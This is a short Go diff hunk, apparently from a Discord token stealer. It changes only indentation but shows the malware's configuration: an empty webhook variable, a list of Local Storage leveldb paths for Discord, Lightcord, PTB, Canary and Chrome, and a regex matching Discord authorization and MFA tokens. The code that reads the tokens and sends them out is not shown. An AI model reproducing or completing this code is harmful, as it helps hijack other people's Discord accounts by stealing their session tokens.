@@ -19,8 +19,8 @@ var (
 	webhook = ""
 	// took these off google lmao
 	directories = []string{"\\discord\\Local Storage\\leveldb" , "\\Lightcord\\Local Storage\\leveldb",
-						   "\\discordptb\\Local Storage\\leveldb",  "\\discordcanary\\Local Storage\\leveldb",
-							"\\..\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"}
+			       "\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb",
+			       "\\..\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"}
 	authorization, _ = regexp.Compile("[N][\\w-]{23}[.][\\w-]{6}[.][\\w-]{27}|mfa.[A-Za-z0-9-_]{84}")
 )
 
